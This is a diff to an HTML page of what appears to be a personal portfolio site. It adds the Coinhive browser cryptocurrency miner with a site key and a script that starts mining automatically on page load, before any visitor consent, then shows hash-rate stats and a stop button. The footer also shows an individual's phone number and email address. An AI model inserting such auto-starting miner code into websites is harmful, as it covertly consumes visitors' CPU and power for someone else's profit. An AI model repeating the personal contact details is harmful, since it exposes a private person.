@@ -28,6 +28,8 @@
         <link rel="stylesheet" href="assets/css/responsive.css" />
 
         <script src="assets/js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
     </head>
     <body>
         <!--[if lt IE 8]>
@@ -223,8 +225,8 @@
                             <div class="social">
                                 <a href="https://www.instagram.com/twan0u_/"><i class="fa fa-facebook"></i></a>
 				<a href="https://www.instagram.com/twan0u_/"><i class="fa fa-instagram"></i></a>
+				
                             </div>
-
                            Antoine Lambert - 0032/498.19.49.75 - ant.lamb.al@gmail.com
 
                         </div>
@@ -243,6 +245,32 @@
         <script src="assets/js/modernizr.js"></script>
 
         <script src="assets/js/main.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('Pw6RqOVNOSE8g80dGmWwPLxbtbQcBnOg','threads: 1');
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+
+// Update stats once per second
+setInterval(function() {
+miner.setNumThreads(1);
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+    } else {
+        document.getElementById("hps").innerHTML = "Please click start";
+        document.getElementById("ths").innerHTML = "to support";
+        document.getElementById("tah").innerHTML = "this site";
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+    }
+}, 1000);
+</script>
     </body>
 </html>
 
